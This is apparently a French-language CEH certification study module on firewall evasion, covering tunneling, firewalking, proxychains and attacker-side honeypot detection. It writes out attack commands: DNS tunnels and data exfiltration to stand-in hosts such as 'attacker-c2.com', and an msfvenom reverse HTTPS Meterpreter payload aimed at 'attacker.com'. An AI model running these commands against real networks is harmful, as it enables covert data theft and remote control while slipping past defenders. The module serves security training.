# 🔴 Module 12 — Évasion Firewall & Détection Honeypot

> **CEH v13 | EC-Council**  
> `#Tunneling` `#Firewalking` `#DNSTunnel` `#Proxychains` `#HoneypotDetection`

---

## 📌 Table des matières

1. [Contournement de Firewall — Techniques générales](#1-contournement-firewall)
2. [Firewalking](#2-firewalking)
3. [DNS Tunneling](#3-dns-tunneling)
4. [HTTP/HTTPS Tunneling](#4-httphttps-tunneling)
5. [ICMP Tunneling](#5-icmp-tunneling)
6. [Proxy Chains et Anonymisation](#6-proxy-chains)
7. [Détection des Honeypots](#7-détection-honeypots)

---

## 1. Contournement de Firewall

### Principe général

```
Règles firewall typiques :
ALLOW  outbound TCP 443 (HTTPS)
ALLOW  outbound TCP 80  (HTTP)
ALLOW  outbound UDP 53  (DNS)
ALLOW  inbound  established
DENY   everything else

Stratégie d'évasion : utiliser les ports autorisés !
→ Tunneler le trafic C&C dans DNS, HTTP, ou HTTPS
```

### Port Source Spoofing

```bash
# Certains firewalls autorisent le trafic entrant depuis le port 53 (DNS)
nmap --source-port 53 target.com
hping3 -s 53 -p 80 target.com

# Depuis le port 20 (FTP data)
nmap --source-port 20 target.com
```

### Fragmentation IPv6 vs IPv4

```
Certains firewalls anciens n'inspectent pas le trafic IPv6.
Dual-stack (IPv4 + IPv6) : tenter la connexion via IPv6 si le firewall ne la filtre pas.
```

---

## 2. Firewalking

Le firewalking détermine les règles d'un firewall en testant quels TTL permettent aux paquets de "passer" ou d'être rejetés.

```
Principe : TTL crafting pour sonder les règles

Réseau : Attaquant ──▶ Firewall (hop 3) ──▶ Cible (hop 4)

Étape 1 : Découvrir la distance du firewall
  nmap --traceroute target.com
  → Firewall à 3 hops

Étape 2 : Envoyer des paquets avec TTL = nb_hops_firewall + 1
  TTL=4, Port 80  → Si pas de "ICMP Time Exceeded" = port OUVERT côté cible
  TTL=4, Port 23  → Si "ICMP Time Exceeded" reçu = port FILTRÉ par firewall
```

```bash
# Outil firewalk :
firewalk -S1-1024 -i eth0 gateway_ip target_ip
```

---

## 3. DNS Tunneling

Encoder des données C&C dans des requêtes/réponses DNS, exploitant le port UDP 53 généralement ouvert.

```
Principe :

Données à exfiltrer : "secret_data"
Encodage Base32 : "ONSWG4TFOIQHK==="
Requête DNS : ONSWG4TFOIQHK.attacker-c2.com  ← Query

Le serveur DNS de l'attaquant reçoit la requête et extrait les données.
Réponse : TXT record avec commandes de l'attaquant

Architecture :
[Victime] ──DNS query──▶ [DNS Resolver] ──▶ [Attacker NS server]
                                                    │
                                              [C2 Server]
                                         (extrait les données encodées)
```

```bash
# Outils DNS tunneling :
# dns2tcp (serveur)
dns2tcp -F -f /etc/dns2tcpd.conf

# iodine (crée une interface réseau via DNS)
# Serveur :
iodined -f 10.0.0.1 tunnel.attacker.com
# Client :
iodine -f -P password tunnel.attacker.com
→ Crée l'interface dns0 avec IP 10.0.0.2

# Détection : volumes DNS inhabituels, sous-domaines très longs
```

---

## 4. HTTP/HTTPS Tunneling

Encapsuler le trafic C&C dans des requêtes HTTP/HTTPS légitimes.

### HTTPtunnel

```bash
# Serveur (cible réseau interne) :
hts -F localhost:22 80    # Forward port 22 SSH sur HTTP port 80

# Client (attaquant externe) :
htc -F 8022:server_ip:80  # Tunnel local port 8022 → HTTP → SSH
ssh user@localhost -p 8022
```

### CONNECT Proxy Abuse

```
Certains proxies HTTP autorisent CONNECT vers n'importe quel port :

Client ──CONNECT evil-c2.com:443 HTTP/1.1──▶ Proxy
Proxy ──TCP──▶ evil-c2.com:443
[Tunnel établi pour C&C]
```

### Reverse Shell via HTTPS

```bash
# Metasploit reverse HTTPS payload :
msfvenom -p windows/meterpreter/reverse_https \
  LHOST=attacker.com LPORT=443 -f exe > payload.exe

# Le meterpreter communique via HTTPS → ressemble à du trafic web normal
# Évite la détection par firewall (port 443 ouvert)
```

---

## 5. ICMP Tunneling

Encapsuler des données dans des paquets ICMP Echo (ping).

```
Principe : Le payload d'un paquet ICMP Echo est arbitraire.

Paquet ICMP normal :
[IP Header][ICMP Header (type=8)][Payload = "abcdefghijklmnopqrstuvwxyz"]

Paquet ICMP tunnel :
[IP Header][ICMP Header (type=8)][Payload = CMD:whoami  ou DATA:secret]

Si le firewall permet le ping → tunnel bidirectionnel possible
```

```bash
# Outil ptunnel-ng :
# Serveur :
ptunnel-ng -x password
# Client :
ptunnel-ng -p server_ip -lp 8022 -da target -dp 22 -x password
ssh user@localhost -p 8022
```

---

## 6. Proxy Chains et Anonymisation

### Proxychains

```bash
# /etc/proxychains.conf
[ProxyList]
socks4  127.0.0.1 9050    # Tor
http    proxy1.com  8080
http    proxy2.com  8080

# Utilisation :
proxychains nmap -sT -p 80 target.com
proxychains firefox
proxychains curl http://target.com

# Modes : strict_chain, dynamic_chain, random_chain
```

### VPN / Tor

```
Tor onion routing :
[Attaquant] ──chiffré──▶ [Node 1] ──chiffré──▶ [Node 2] ──▶ [Node 3 (exit)] ──▶ [Cible]

→ La cible ne voit que l'IP du nœud de sortie
→ Chaque nœud ne connaît que le précédent et le suivant
→ Détection : traffic vers IPs Tor connues (liste publique)
```

---

## 7. Détection des Honeypots (côté attaquant)

L'attaquant cherche à identifier si une machine cible est un honeypot pour éviter d'y passer du temps.

### Indicateurs de honeypot

```
1. Comportement anormal :
   - Trop de services ouverts (pas cohérent pour un poste de travail)
   - Réponses parfaitement conformes aux RFC (trop "propres")
   - Latence artificielle sur certains services

2. Empreinte de honeypot connu :
   - Kippo SSH : banner "SSH-2.0-OpenSSH_5.1p1 Debian-5" (version figée)
   - Cowrie : certaines commandes retournent des réponses génériques
   
3. Test de cohérence :
   - Créer un fichier → vérifier qu'il existe vraiment
   - Modifier la config → vérifier que ça se répercute
   - Exécuter un malware → vérifier comportement réseau réel

4. Analyse des ressources :
   - Honeyd (low-interaction) : OS fingerprinting Nmap révèle des incohérences
   - VM détection (VMware, VirtualBox) : indicateurs dans /proc, CPUID
```

### Honeypot Fingerprinting

```bash
# Test Nmap avec détection d'OS :
nmap -O target.com
→ Si OS = "Linux 2.6" mais réponses TCP = Windows → Honeyd !

# Test avec Nmap scripts :
nmap --script honeypot target.com

# Vérification des artefacts :
ls /etc/vmware         → Présence VMware
cat /proc/scsi/scsi    → Contrôleur virtuel
```

---

## 🧠 Points clés à retenir pour l'examen

- **DNS tunneling** = données encapsulées dans requêtes DNS (port 53)
- **HTTP tunneling** = C&C via port 80/443 (toujours autorisé)
- **Firewalking** = déterminer les règles firewall par TTL crafting
- **Proxychains** = chaîner des proxies pour anonymiser le trafic
- **Honeypot low-interaction** = émule des services (ex: Honeyd)
- **Honeypot high-interaction** = vrai OS, vrai service (ex: Cowrie)
- La **détection d'honeypot** repose sur des incohérences comportementales ou d'empreinte

---

*⬅️ [Évasion IDS](./02_techniques_evasion_ids.md) | ➡️ [Outils et Labs](./04_outils_et_labs.md)*
